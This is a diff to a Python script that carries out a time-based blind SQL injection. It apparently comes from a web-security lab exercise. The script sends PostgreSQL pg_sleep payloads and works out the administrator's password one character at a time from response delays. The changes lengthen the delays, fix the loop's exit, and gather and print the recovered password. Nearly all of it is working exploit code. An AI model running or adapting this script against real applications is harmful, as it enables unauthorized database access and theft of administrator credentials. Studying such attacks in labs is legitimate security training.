@@ -88,12 +88,13 @@ def findEntry(inTrigger, URL, sessID):
 def fuzzPass(inTrigger, URL, sessID):
 
     symbols=list(string.ascii_lowercase + string.ascii_uppercase + string.digits)
+    password = []
   
-    for letter_pos in range(1,21,1):
+    for letter_pos in range(1,25,1):
         for i in range(len(symbols)):
             payload = "'; SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,"
             payload += str(letter_pos) 
-            payload += ",1)='" + symbols[i] + "') THEN pg_sleep(1) ELSE pg_sleep(0) END FROM users--"
+            payload += ",1)='" + symbols[i] + "') THEN pg_sleep(3) ELSE pg_sleep(0) END FROM users--"
 
            #print("sending...")
             #print(payload)
@@ -104,11 +105,13 @@ def fuzzPass(inTrigger, URL, sessID):
             if timeElpased >= inTrigger:
                 print("[+] Password letter found")
                 print("Position: " + str(letter_pos) + " and Value= " + symbols[i])
+                password.append(symbols[i])
+                print("".join(password))
                 break
 
-            if i == len(symbols):
+            if i == (len(symbols) - 1):
                 print("No more matching characters. Exiting")
-                return
+                return password
 
 
 
@@ -138,21 +141,13 @@ def main():
 
 
     # trigger in seconds
-    inTrigger = 1
+    inTrigger = 3
 
     #findEntry(inTrigger, targetURL, sessID)
 
-    fuzzPass(inTrigger, targetURL, sessID)
+    password = fuzzPass(inTrigger, targetURL, sessID)
 
-'''
-    while 1:
-        timeElpased = sendRequest(targetURL, cookies)
-
-        if timeElpased >= inTrigger:
-            print("Time to response is high -> time based SQLi possible")
-        else:
-            print("Time delay not triggered")
-'''
+    print("And the Admin Password is " + ''.join(password))
 
 if __name__ == "__main__":
     main()
